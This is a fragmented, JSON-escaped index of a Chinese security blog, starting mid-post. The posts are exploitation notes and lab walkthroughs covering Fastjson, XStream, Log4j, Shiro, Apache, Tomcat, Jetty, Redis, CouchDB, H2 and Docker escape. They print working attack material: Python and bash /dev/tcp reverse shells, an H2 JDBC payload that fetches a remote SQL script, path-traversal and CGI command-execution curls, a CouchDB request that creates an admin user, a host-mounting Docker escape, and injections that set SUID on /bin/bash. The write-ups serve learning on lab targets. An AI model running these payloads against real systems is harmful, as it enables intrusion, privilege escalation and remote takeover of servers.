或者反弹shell\n这里注意对面是有WAF的\n但还可以使用添加_或+处理关键字绕过，可参考\nhttps://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/)\n这里使用\\u unicode不行换这个成功执行\ntest 这里因为是不出网络所以按道理反弹SHELL是不行的 我这里是因为环境问题 你可以写入一个内存马写入后门达到获取SHELL\n更好的是使用SLEEP来判断是否执行了命令\n打入哥斯拉内存马\ntest 使用/*内存马任意访问\ntest POST /login HTTP/1.1\rHost: IP\rContent-Length: 24035\rX-Requested-With: XMLHttpRequest\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\rAccept: */*\rContent-Type: application/json; charset=UTF-8\rAccept-Encoding: gzip, deflate, br\rAccept-Language: en-US,en;q=0.9\rConnection: keep-alive\r{\r\u0026#34;a\u0026#34;:{\r\u0026#34;@type\u0026#34;:\u0026#34;java.lang.Class\u0026#34;,\r\u0026#34;val\u0026#34;:\u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\u0026#34;\r},\r\u0026#34;b\u0026#34;:{\r\u0026#34;@type\u0026#34;:\u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\u0026#34;,\r\u0026#34;us_erOverridesAsString\u0026#34;:\u0026#34;HexAsciiSerializedMap:;\u0026#34;,\r}\r} ","date":"16 July 2025","externalUrl":null,"permalink":"/posts/fastjson/","section":"Posts","summary":"","title":"Fastjson","type":"posts"},{"content":"","date":"16 July 2025","externalUrl":null,"permalink":"/tags/fastjson/","section":"Tags","summary":"","title":"Fastjson","type":"tags"},{"content":" CVE-java-jackson-xstream-fastjson # jackson # jackson CVE-2020-8840 # JNDI\ntest CVE-2020-35728 # JNDI\ntest Xstream # Xstream 开源Java类库，能将对象序列化成XML或XML反序列化为对象\n代码执行 (CVE-2021-21351） # Xstream\u0026lt;=1.4.15\nvulhub/xstream/CVE-2021-21351/README.zh-cn.md at master · vulhub/vulhub · GitHub\n直接改变类型为xml\ntest 放入JNDI注入代码\ntest 反弹成功\ntest CVE-2021-29505 # vulhub/xstream/CVE-2021-29505/README.zh-cn.md at master · vulhub/vulhub · GitHub\nXStream \u0026lt;= 1.4.16\n你可以先测试下解析XML不 要看对方的代码逻辑\n是看具体标签对不对还是格式对就行\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;user\u0026gt; \u0026lt;name\u0026gt;Bob\u0026lt;/name\u0026gt; \u0026lt;age\u0026gt;22\u0026lt;/age\u0026gt; \u0026lt;/user\u0026gt;\ruser是标签 里面是他的子标签 java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1089 CommonsCollections6 \u0026ldquo;bash -c {echo,base64数据反弹命令}|{base64,-d}|{bash,-i}\u0026rdquo;\nbash -i \u0026gt;\u0026amp; /dev/tcp/xx/xx 0\u0026gt;\u0026amp;1\n测试有xml数据发送\ntest 本地监听一个1089端口 里面是CC链条的反弹SHELL命令\ntest 放入POC\ntest 反弹成功\ntest 这里工具使用ysoserial-all.jar 和 ysoserial-0.0.8-SNAPSHOT-all.jar都可以\nFASTJSON # fastjson到1.2.80 已经基本把本地链条封完了 只能通过外部链接 执行\nvulhub/fastjson/1.2.24-rce/README.zh-cn.md at master · vulhub/vulhub · GitHub\n1.2.40\n这里是访问会返回JSON数据我们输入错误可以\ntest 创建成功\ntest 介绍两个推荐插件 右键发送\n直接爆出利用代码 FastjsonScan\ntest 爆出版本FastjsonScan4Burp\ntest ","date":"14 July 2025","externalUrl":null,"permalink":"/posts/cve-java-jackson-xstream-fastjson/","section":"Posts","summary":"","title":"CVE-java-jackson-xstream-fastjson","type":"posts"},{"content":"","date":"14 July 2025","externalUrl":null,"permalink":"/tags/jackson/","section":"Tags","summary":"","title":"Jackson","type":"tags"},{"content":"","date":"14 July 2025","externalUrl":null,"permalink":"/tags/xstream/","section":"Tags","summary":"","title":"Xstream","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/apache/","section":"Tags","summary":"","title":"Apache","type":"tags"},{"content":" CVE-java-solr-log4j-shiro # 主要基于HTTP和Apache Lucene实现的全文搜索服务器。\n8393端口\n历史漏洞：https://avd.aliyun.com/search?q=Solr\ntest CVE-2019-17558命令执行 # 用PY2.7来运行脚本\ntest CVE-2019-0193-命令执行 # Apache Solr \u0026lt; 8.2.0版本 条件1：Apache Solr的DataImportHandler启用了模块DataImportHandler(默认不会被启用) 条件2：Solr Admin UI未开启鉴权认证。（默认情况无需任何认证）\nPOC，点击Execute with this Confuguration\ntest CVE-2024-45216 认证绕过 # GET /solr/admin/info/properties:/admin/info/key 发包看返回\nSHIRO 看remeberme # CVE-2020-11989-绕过验证 # Poc：/admin/%20 影响范围：Apache Shiro \u0026lt; 1.7.1\nCVE-2022-32532 绕过鉴权 # Poc： /permit/any\n/permit/a%0any可绕过\nSHIRO反序列 java -jar ysoserial.jar CommonsCollections5 \u0026ldquo;calc.exe\u0026rdquo; \u0026gt; payload.ser生成 使用AES默认密钥加密 \u0026gt; base64加密\nLOG4J # CVE-2021-44228 # PAYLOAD能插入jndi的就插入进去试试\nVULNHUB靶场\n生成JNDI注入\ntest 本地监听\n在参数直接插入进去\ntest 拿到SHELL\ntest 不成功可能：\n对方没有log4j LOG4J版本高 JDK版本过高\n","date":"13 July 2025","externalUrl":null,"permalink":"/posts/cve-java-solr/","section":"Posts","summary":"","title":"CVE-java-solr-log4j-shiro","type":"posts"},{"content":" CVE-vulfocus-apache-tomcat-jetty-weblogic # ApacheSSRF-CVE-2021-40438 # 版本在其2.4.48及以前的版本中\nApache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.48及以前的版本中，mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞\n访问输入POC\nGET /?unix|http://example.com/ HTTP/1.1\rHost: 123.58.224.8:31947\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\rConnection: close 发现成功执行了SSRF命令 接下来就可以试试file本地读取命令了\nApache路径穿越-CVE-2021-41773 # 版本-2.4.49\n路径穿越 curl -v \u0026ndash;path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n注意 \u0026ndash;path-as-is 高版本可以用\nApache路径穿越-CVE-2021-42013 # \u0026ldquo;Apache/2.4.50\u0026rdquo;\n注意curl版本 windows不行试试linux的\n绕过前面41337的补丁\n版本2.4.50\n我们抓包可以看见版本\nPOC读取文件\ncurl -v --path-as-is http://123.58.224.8:44467/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd 在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：\n命令执行 # curl -v \u0026ndash;data \u0026ldquo;echo;id\u0026rdquo; \u0026lsquo;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh\u0026rsquo;\n额fofo试了下没什么用\nTOMCAT # TOMCAT终端登录密码 在配置文件中默认tomcat tomcat\ntomcat-users.xml\n弱口令 # 存在面板\n上传WAR包后访问后门\n生成后门后成功压缩文件改zip格式为war即可\n成功getshell\nCVE-2020-1938 AJP文件包含漏洞 # 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。\nTomcat 6.*\nTomcat 7.* \u0026lt; 7.0.100\nTomcat 8.* \u0026lt; 8.5.51\nTomcat 9.* \u0026lt; 9.0.31\n这个脚本用PY2.7使用\nTOMCAT RCE CVE-2025-24813 # https://www.cnblogs.com/smileleooo/p/18772389 需要满足条件\njetty # 一个开源的servlet容器，它为基于Java的Web容器提供运行环境。\nCVE-2021-28169 对于\u0026lt;= 9.4.40、\u0026lt;= 10.0.2、\u0026lt;= 11.0.2的Eclipse Jetty版本，\ncurl -v http://123.58.224.8:16187/static?/%2557EB-INF/web.xml 为什么不在url直接用因为浏览器会自动解码加载必须curl\nF12可以发现是jetty\nCVE-2021-34429对于9.4.37-9.4.42、10.0.1-10.0.5和11.0.1-11.0.5的Eclipse /%u002e/WEB-INF/web.xml\nweblogic # CVE很多直接工具梭哈\nweblogicTool\n# ","date":"13 July 2025","externalUrl":null,"permalink":"/posts/cve-apache-jetty-tomcat/","section":"Posts","summary":"","title":"CVE-vulfocus-apache-tomcat-jetty-weblogic","type":"posts"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/jetty/","section":"Tags","summary":"","title":"Jetty","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/log4j/","section":"Tags","summary":"","title":"Log4j","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/shiro/","section":"Tags","summary":"","title":"Shiro","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/solr/","section":"Tags","summary":"","title":"Solr","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/tomcat/","section":"Tags","summary":"","title":"Tomcat","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/vulhub/","section":"Tags","summary":"","title":"Vulhub","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/weblogic/","section":"Tags","summary":"","title":"Weblogic","type":"tags"},{"content":"","date":"12 July 2025","externalUrl":null,"permalink":"/tags/couchdb/","section":"Tags","summary":"","title":"Couchdb","type":"tags"},{"content":" CVE-vulfocus-vulhub-redis-couchdb-H2DB # redis- 高性能内存数据库 # 关于redis 我们直接在vulfocus上面拉镜像并使用脚本文件redis-rogue-server-master即可通杀\n高速缓存 作为数据库前端缓存，减少数据库访问压力。 案例：电商首页热门商品缓存、新闻网站热门文章缓存。 实时数据处理 支持高并发读写（单节点 QPS 可达 10 万 +），适合实时统计场景。 案例：直播间在线人数统计、秒杀活动库存扣减。 一般来说redis的CVE就是配置不当 bind 127.0.0.1 是默认开启的 然后requirepass默认为空意思就是本地随便进去\r但是你如果不想本地但是又忘记修改密码就会造成问题 CNCD-2015-07557打开靶场设置脚本的目的为靶机IP 端口他把默认端口6379映射为36700 直接运行选择r反弹shell\n我们对端监听就可以发现直接反弹成功拿下了服务器\r用户是redis表示他使用redis来当用户 这里redis的CVE CNVD都能用这个脚本来运行测试 原理就是未授权加上模块的恶意执行\n一般个人测是三方面\n写入web后门 要求-对方有web服务器 ssh密钥登录 要求-root权限 密钥登录允许 写入计时任务 要求-root权限 系统限制 如centos可以 ubantu可能有字符错误 CouchDB-cve_2017_12636-面向文档、强调分布式一致性 # CouchDB 内置多主复制和冲突检测机制，适合移动应用、协作工具（如笔记应用）等需要离线工作的场景。 案例：医疗记录系统（医生在无网络环境下访问 / 修改数据，恢复网络后自动同步）。\n文档型数据管理 适合存储结构化程度较低的数据（如博客文章、产品目录），无需预定义表结构。 案例：内容管理系统（CMS）存储文章、评论等。\n高可用分布式系统 通过多节点复制实现自动故障转移，适合地理分布的应用。 案例：跨国公司的分布式办公系统。\n历史数据追踪 支持文档版本控制（MVCC），适合需要审计日志的场景。 案例：金融交易记录系统。\n修改反弹ip端口\n使用PY脚本运行这里\nCVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。\nCouchDB-CVE-2022-24706 # 在vulhub使用docker-compose up -d 启动端口 它默认启动了4369和 本身端口 5984\n5984: Apache CouchDB Web管理接口 4369: Erlang端口映射服务（epmd） 9100: 集群节点通信和运行时自省服务（代码执行实际发生在这个端口中） 这里利用的就是这个分布式端口4369\n这个POC会先通过目标的4369端口epmd服务获取集群通信的端口，也就是9100，然后再使用默认Cookie来控制节点执行任意命令。 couchdb-cve_2017_12635 # 上面那个CVE就是基于这个漏洞进行任意注册直接查看数据库信息\n访问Get:/_utils/ 需要登录用漏洞cve_2017_12635\nPOC 添加用户user 是admin组的\nPUT /_users/org.couchdb.user:用户 HTTP/1.1\rHost: XX:XX\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\rConnection: close\rContent-Type: application/json\rContent-Length: 108\r{\r\u0026#34;type\u0026#34;: \u0026#34;user\u0026#34;,\r\u0026#34;name\u0026#34;: \u0026#34;用户\u0026#34;,\r\u0026#34;roles\u0026#34;: [\u0026#34;_admin\u0026#34;],\r\u0026#34;roles\u0026#34;: [],\r\u0026#34;password\u0026#34;: \u0026#34;密码\u0026#34;\r} 再访问可以查看数据库了\nH2database -CVE-2022-23221 # Java SQL 数据库 H2,H2的主要特点是：非常快，开源，JDBC API；嵌入式和服务器模式；内存数据库；基于浏览器的控制台应用程序。H2 数据库控制台中的另一个未经身份验证的 RCE 漏洞，在v2.1.210+中修复。2.1.210 之前的H2控制台允许远程攻击者通过包含子字符串的jdbc:h2:mem JDBC URL执行任意代码。\n输入后直接进入读取文件了\n拿到SHELL步骤\n进入后在你公网主机创建数据库文件并且监听打开python服务\nCREATE TABLE test (\rid INT NOT NULL\r);\rCREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS \u0026#39;//javascript\rJava.type(\u0026#34;java.lang.Runtime\u0026#34;).getRuntime().exec(\u0026#34;bash -c {echo,反弹的base64输入}|{base64,-d}|{bash,-i}\u0026#34;);\u0026#39;;\rbash -i \u0026gt;\u0026amp; /dev/tcp/x.x.x.x/5566 0\u0026gt;\u0026amp;1 创建sql文件能访问后退出首页再次输入\njdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM \u0026#39;http://116.62.32.64:8000/123.sql\u0026#39;;\\ NC监听对应sql文件的端口得到SHELL\n总结 # 他们数据库和mysql关系性的区别\nMySQL 是 “系统的核心账本”，适合存储结构化、需要强事务保证的核心业务数据（如订单、支付记录）； CouchDB 是 “灵活的文档仓库”，适合存储结构多变、需要分布式同步的文档数据（如博客文章、离线应用数据）； Redis 是 “高速数据中转站”，核心价值之一是作为缓存，通过内存存储高频数据，解决数据库性能瓶颈。 三者并非替代关系，实际业务中常结合使用（例如：MySQL 存订单，Redis 缓存订单列表，CouchDB 存用户生成的动态内容）。 redis缓存：\n而 Redis 基于内存存储，读写速度极快，且支持复杂数据结构，非常适合作为 “中间层缓存”，让高频数据直接从 Redis 读取，而非每次都访问数据库。\n","date":"12 July 2025","externalUrl":null,"permalink":"/posts/cve-vulfocus-vulhub-redis-couchdb-h2db/","section":"Posts","summary":"","title":"CVE-vulfocus-vulhub-redis-couchdb-H2DB","type":"posts"},{"content":"","date":"12 July 2025","externalUrl":null,"permalink":"/tags/redis/","section":"Tags","summary":"","title":"Redis","type":"tags"},{"content":"","date":"12 July 2025","externalUrl":null,"permalink":"/tags/sudoers/","section":"Tags","summary":"","title":"Sudoers","type":"tags"},{"content":" sudo靶机\u0026mdash;难度easy知识点-爆破-sudoers # Nmap扫描发现常规端口 80和22 # 访问80看看 这里我直接爆破了-这里劫持到后发送到repeter这里的token感觉没什么用的感觉\n爆破密码是admin@123 这里爆破后你回来返回会发现自动跳转了 我后面测试这个token不管就行你repeter输入完也是自动跳转两个token不一样都行 进去后上传文件- 执行获得shell 这里密码其实在readme.md里面了我没看到.\n拿到shell权限 # 上传linpeas扫描发现suid文件\n读取shadow试试\njohn一下\n拿root # 进入eecho用户后发现没有sudo -l\n只有这个读取文件利用读取下 sudoers\r这里发现了可以有一个但是要主机名是dashazi我们就以主机名是dashazi来运行就行 不会命令就AI 反弹SHELL 总结一下 # 1：配置文件多看看\n","date":"12 July 2025","externalUrl":null,"permalink":"/posts/sudo/","section":"Posts","summary":"","title":"sudo靶机---难度low知识点-爆破-sudoers","type":"posts"},{"content":"","date":"12 July 2025","externalUrl":null,"permalink":"/tags/vulfocus/","section":"Tags","summary":"","title":"Vulfocus","type":"tags"},{"content":"","date":"12 July 2025","externalUrl":null,"permalink":"/tags/%E7%88%86%E7%A0%B4/","section":"Tags","summary":"","title":"爆破","type":"tags"},{"content":"","date":"11 July 2025","externalUrl":null,"permalink":"/tags/portswigger/","section":"Tags","summary":"","title":"Portswigger","type":"tags"},{"content":"","date":"11 July 2025","externalUrl":null,"permalink":"/tags/websocket/","section":"Tags","summary":"","title":"Websocket","type":"tags"},{"content":" bp靶场\u0026mdash;websocket-messages to exploit vulnerabilities # WebSocket 是一种在**单个 TCP 连接上进行全双工通信**的协议，允许客户端（如浏览器）和服务器之间实时交换数据，无需频繁的 HTTP 请求。它彻底改变了 Web 应用的实时性体验，广泛应用于聊天、实时数据监控、在线游戏等场景。是一个应用层协议 协议开头ws(http)或者wss(https) BP介绍 # BURP是可以抓取websocket数据的 可以发现我们输入什么我们发送服务器 服务器发送数据回来进行实时交互 F12也可以看数据发送 实验 # 这里要求我们注入xss 输入试试 - 发现不行 原来是进行了过滤我们修改抓包试试 可以看到这里的TYPE不是HTTP是WS 它们相互配合完成效果 成功 总结一下 # websocket技术是一个实时交互技术 他和 HTTP区别有吗？\nHTTP 协议的 “硬伤”：无法满足实时交互的核心需求 # ​\tHTTP 是 “请求 - 响应” 模式的协议，即使通过技术手段 “保持连接”（如 HTTP/1.1 的 Connection: keep-alive 持久连接），也无法突破其本质限制：\n通信方向受限：服务器不能主动发数据 HTTP 中，只有客户端主动发送请求（Request），服务器才能被动回应（Response）。服务器永远无法 “主动” 向客户端推送数据 —— 这是实时交互（如聊天、实时监控）的核心障碍。\n例如：如果用 HTTP 做聊天软件，A 给 B 发消息后，服务器无法主动通知 B “有新消息”，B 必须不断手动刷新（或客户端定时发请求）才能收到，体验极差。\n“保持连接” 不等于 “实时双向通信” HTTP/1.1 的 keep-alive 确实能让 TCP 连接复用（避免每次请求重新握手），但连接的控制权仍在客户端：\n客户端不发请求时，服务器无法利用这个连接 “主动说话”； 连接的超时时间由服务器或客户端控制（通常几秒到几分钟），到期后会自动断开，无法 “永久保持”。 轮询 / 长轮询的低效性 为了模拟 “实时性”，HTTP 场景下常采用两种妥协方案，但都有明显缺陷：\n轮询\n：客户端每隔几秒发一次请求（如 “有新消息吗？”），服务器回复 “有 / 没有”。\n问题：大量无效请求（比如 90% 的请求都是 “没有新消息”），浪费带宽和服务器资源；延迟高（至少等于轮询间隔）。 长轮询\n：客户端发请求后，服务器不立即回复，而是 “挂起” 请求，直到有数据时才响应（或超时后回复空），客户端收到后立刻再发新请求。\n问题：服务器需要维持大量 “挂起的请求”，消耗内存；超时机制仍会导致延迟；本质还是客户端 “被动等待”，而非服务器 “主动推送”。 websocket\u0026mdash;\u0026ndash;\n二、WebSocket 的核心价值：解决 HTTP 的 “被动性” # WebSocket 正是为解决上述问题而生，它的设计直接瞄准 “实时双向通信”：\n全双工通信：服务器和客户端可随时互发数据 WebSocket 连接建立后，客户端和服务器地位平等 —— 双方可以在任何时候主动向对方发送数据，无需等待对方请求。 例如：聊天场景中，A 发消息后，服务器可立即通过 WebSocket 主动推送给 B，B 无需任何操作就能实时收到。 一次握手，永久连接（按需） WebSocket 连接通过 HTTP 握手升级而来（仅一次 HTTP 请求），之后彻底脱离 HTTP 协议，基于纯 TCP 进行双向通信： 连接一旦建立，除非主动断开（客户端 / 服务器调用关闭），否则会一直保持； 数据传输时无需携带 HTTP 头部（仅少量 WebSocket 帧协议开销），比 HTTP 轮询高效 10 倍以上。 极低延迟和资源消耗 没有 HTTP 轮询的 “无效请求” 和 “头部冗余”（HTTP 头部通常几百字节到几 KB，WebSocket 帧头部仅 2-10 字节）； 服务器无需维持大量 “挂起的请求”，一个 WebSocket 连接即可支撑双向实时通信，资源占用极低。 WebSocket 的典型场景 # 正因为解决了 HTTP 的核心限制，WebSocket 成为实时交互场景的 “最优解”：\n即时通讯（聊天软件、客服系统）； 实时数据监控（股票行情、系统监控面板）； 协作工具（多人在线文档、白板）； 在线游戏（实时同步玩家操作和状态）； 直播弹幕、实时投票等。 HTTP 协议的设计初衷是 “客户端请求 - 服务器响应” 的单向交互，即使保持连接，也无法突破 “服务器不能主动推送” 的本质限制；而 WebSocket 专为 “双向实时通信” 设计，通过一次连接实现全双工数据传输，彻底解决了 HTTP 在实时场景下的低效和延迟问题。\n","date":"11 July 2025","externalUrl":null,"permalink":"/posts/portswigger-websocket-websocket-messages-to-exploit/","section":"Posts","summary":"","title":"websocket-messages-to-exploit-vulnerabilities","type":"posts"},{"content":"","date":"25 June 2025","externalUrl":null,"permalink":"/tags/docker%E9%80%83%E9%80%B8/","section":"Tags","summary":"","title":"Docker逃逸","type":"tags"},{"content":" language靶机\u0026mdash;难度easy知识点-docker逃逸-爆破 # Nmap扫描发现端口 80和9999 # 访问80没东西 就访问9999端口-结果是pikachu 那就直接RCE就行 但是他这里RCE 什么命令都没有或者限制了？ 试试其他的反弹\r127.0.0.1 | python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.1.126\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\r成功了 拿到shell权限 # 这里翻到了数据库密码 进去看看 这里翻到了一个用户叫ml 但是这里系统什么用户都没有 很奇怪啊 这里一开始就怀疑是docker容器里面 这里翻到了一些提示文件和判断是不是docker 判断是不是docker\r1：主机名字 输入字符返回长字符串\r2：ls /sys/fs/cgroup 这目录 是 Docker 和其他容器技术使用的cgroup（控制组）信息所在的目录。查看有无\r3：docker ps直接查看有无\r而且这靶机用户都没有很大几率在docker里面 然后我们获得用户同时那个提示证明密码有关用户名爆破就行\rcat /usr/share/wordlists/rockyou.txt | grep \u0026#39;^ml\u0026#39; \u0026gt; ml.txt 取出以ml开头的 拿root # 登录上去 发现.bash_history没有删除并且sudo -l 然后他启动了一个容器 没有 呃呃呃 这里做WP发现一个直接方法\rDocker 容器本身运行时默认是以 root 用户身份运行的（除非你明确指定以其他用户身份运行），所以容器内你会获得 root 权限。 这里说明下我在容器创建的123.txt 我在外面是看不到的他建立的容器没有和本身建立连接不能修改本身\r这里我做的直接挂载并且和本身建立连接 意思你修改容器也会修改源文件/\r这里我重新拿一个镜像docker run -v /:/mnt -it alpine chroot /mnt sh 并且在根目录创建文件hahaha.txt 我们退出到用户看看有没有 确实存在 所以我们写入.ssh就可以提权到本身的root里面 解释代码 - docker run -v /:/mnt -it alpine chroot /mnt sh docker run 用于启动一个新的容器并执行指定的命令\r-v /:/mnt -v表示挂载 /映射到/mnt目录\r-it -i 让容器保持交互模式，-t 给你一个终端。\rchroot /mnt sh 这里最关键步骤 容器里的命令执行环境就变成了宿主机的文件系统 相当于你“切换根”，从容器转到了宿主机上\rsh 执行一个 shell 在宿主机文件系统根目录中执行 /bin/sh 如何防范\r1：禁用容器挂载卷功能\r2：root开启镜像时候：Docker 容器默认会以 root 用户运行，如果没有特别限制，容器内的用户可以执行很多敏感操作\r可以\rdocker run --privileged=false -it ubuntu 禁用特权模式\r3：限制挂载目录\r关键点还是 不要直接将 Docker 权限直接给到用户手上 总结一下 # 1：如果用户有 Docker 权限，并且能够控制 Docker 容器，他们几乎能够绕过所有容器内的限制（包括文件系统权限），并直接访问宿主机资源。因此，防止将 Docker 权限授予非管理员用户是容器安全的基础。如果 Docker 权限无法被控制，其他的安全措施将显得非常脆弱。\n","date":"25 June 2025","externalUrl":null,"permalink":"/posts/language/","section":"Posts","summary":"","title":"language靶机---难度easy知识点-docker逃逸-爆破","type":"posts"},{"content":" hoshi靶机\u0026mdash;难度medium知识点-文件包含+表达式注入+盲水印 # Nmap扫描发现端口 80和22 # 我们先访问看看WEB什么效果 index.php 好吧又是经典的界面 现在看到这种界面就感觉难度不低 这里提交反馈会在下面生成在uploads文件夹生成你的文件名 我们再看admin.php\r这里需要密码 我们看看源码然后这里爆破了下都没发现什么 先放在这里 目录扫描到一个/robots.txt 文件我们访问看看 这里卡了很久问了下作者说是用盲水印 工具就选这个 bwm.py\rpython bwmforpy3.py decode MAZ.png int.png 123.png\r前面maz是原图 int是水印图 123.png是生成图片 我们访问目录 - 这里只有一个GIFT.PHP我们访问 这种看着就有点像带参数 我们FUZZ下\rwfuzz -w /usr/share/zidian/SecLists-2023.2/Discovery/Web-Content/common.txt -u http://IP/hoshi/gift.php?FUZZ=index.php --hl 0 他返回了index.php界面 也就是说可能是 文件包含 这里我有一个思路 不是一开始生成产生了txt文件吗 我们把txt文件包含不就行了 如图他只能包含html下的 不能出现/ .. 符号 有没有可能把txt文件放上来呢 这里我在名字前面加../果然他目录发生了变化不在uploads里面放到了html里面然后我去包含试试 看到上面就发现不行了txt里面需要完整php代码但是被实体化了肯定加载不了了\r都变成了文字 然后卡了很久问下下作者\r才想到密码文件还没用这里就是猜密码了 这里我用密码生成工具生成hoshi模板密码都没用\r然后试了域名 结果把客服电话放上去发现可以了 400-123-4567 但是吧也没注意什么这里又卡了几个小时吧\r然后问作者XD 结果发现了一个 这里你可以试试静态页面肯定就是html页面了 也就是说你生成的反馈文件会被admin.php生成admin.html\r但是HTML怎么执行系统命令呢 有PHP语句也不行啊 但是你忘了还有一个文件包含点了吗 而且我们文件名是随便取得 拿到shell权限 # 我们创建一个这样名字得反馈文件然后先访问admin.html看看有没有 访问admin.html 因为我们没有执行admin.php所以还没加载进去 访问看看是否加载了\n确实加载了我们得html应该也变了 我们再包含试试 可以看到成功执行\r接着我们上传一个\r\u0026lt;?php system($_GET[\u0026#34;a\u0026#34;]) ?\u0026gt; 然后反弹busybox\r成功拿到SHELL 这里有疑问\r1：你生成\u0026lt;?phhxxx?\u0026gt;文件你直接包含admin.php不行吗 1.1 admin.php生成的是html代码 - \u0026gt; 里面有php命令 但是被注释了 因为HTML代码会把PHP注释掉\r所以包含html里面会执行PHP代码 拿root # 这里家目录有一个welcome用户 但是要找密码\r在/var/backups 有一个shadow~ 使用john解码获得密码loveme2 然后登录 sudo一下这种一看就是NC访问 我们访问执行下 这里有一个日志可以看怎么执行得 这里猜出来很大概率是拼接 那我们可以表达式注入这里禁用了很多字符如| \u0026amp; ； 但是\u0026amp;\u0026amp;没有这里给出payload\rexec_cmd whoami\u0026#39; \u0026amp;\u0026amp; chmod +s /bin/bash \u0026#39;\rexec_cmd id\u0026#39; \u0026amp;\u0026amp; ls -al \u0026amp;\u0026amp; \u0026#39;\rexec_cmd whoami\u0026#39; $(chmod +s /bin/bash) \u0026#39; 总结一下 # 1：累死了 但是学到了\n","date":"23 June 2025","externalUrl":null,"permalink":"/posts/hoshi/","section":"Posts","summary":"","title":"hoshi靶机---难度medium知识点-文件包含+表达式注入+盲水印","type":"posts"},{"content":"","date":"23 June 2025","externalUrl":null,"permalink":"/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","section":"Tags","summary":"","title":"文件包含","type":"tags"},{"content":"","date":"23 June 2025","externalUrl":null,"permalink":"/tags/%E7%9B%B2%E6%B0%B4%E5%8D%B0/","section":"Tags","summary":"","title":"盲水印","type":"tags"},{"content":"","date":"23 June 2025","externalUrl":null,"permalink":"/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/","section":"Tags","summary":"","title":"表达式注入","type":"tags"},{"content":" gigachad靶机\u0026mdash;难度easy知识点-nail # Nmap扫描发现端口开放 # 直接试FTP匿名访问\n得到一共URL我们访问下\n你问AI可以也可以识图\n这里得到密码maidenstower\n拿到shell权限 # 这里注意有一程序s-nail\n我们可以去msfconsole去搜PAYLOAD\n然后PYTHON传过去\n拿root # 提权成功\n总结一下 # ","date":"21 June 2025","externalUrl":null,"permalink":"/posts/gigachad/","section":"Posts","summary":"","title":"gigachad靶机---难度easy知识点-nail","type":"posts"},{"content":"","date":"21 June 2025","externalUrl":null,"permalink":"/tags/nail/","section":"Tags","summary":"","title":"Nail","type":"tags"},{"content":" yibasuo靶机\u0026mdash;难度easy知识点-nail # Nmap扫描发现端口开放 # 这里注意FTP版本2.3.4有一个笑脸RCE 当你执行如 root:)会开启端口\n但是你去NC会发现不行 可能是防火墙限制了本地访问\n直接试FTP匿名访问\n可以但是credit里面没有信息所以就不看了\n访问URL看下\n弱口令 password123 多试试字典\n后面\u0026hellip;代码没加载完嘛 然后试试busybox 可以\n拿到shell权限 # 进去看看有一个用户todd 然后看防火墙有本地连接限制我们本地连接就可以拿到权限\ncat /etc/iptables/rules.v4 拿root # 上面是标准下面是另一条弱口令路线‘ 通过模板生成用户名密码\nbash generate_by_username.sh todd \u0026gt; todd.txt 然后登录可以用bash\n总结一下 # 1：不要忘记弱口令爆破\n2：这里又了解一个CVE vtp的2.3.4漏洞\n","date":"21 June 2025","externalUrl":null,"permalink":"/posts/yibasuo/","section":"Posts","summary":"","title":"yibasuo靶机---难度easy知识点-nail","type":"posts"},{"content":"","date":"20 June 2025","externalUrl":null,"permalink":"/tags/sql%E6%B3%A8%E5%85%A5/","section":"Tags","summary":"","title":"SQL注入","type":"tags"},{"content":" talk靶机\u0026mdash;难度easy知识点-SQL注入 # Nmap扫描发现端口开放 # 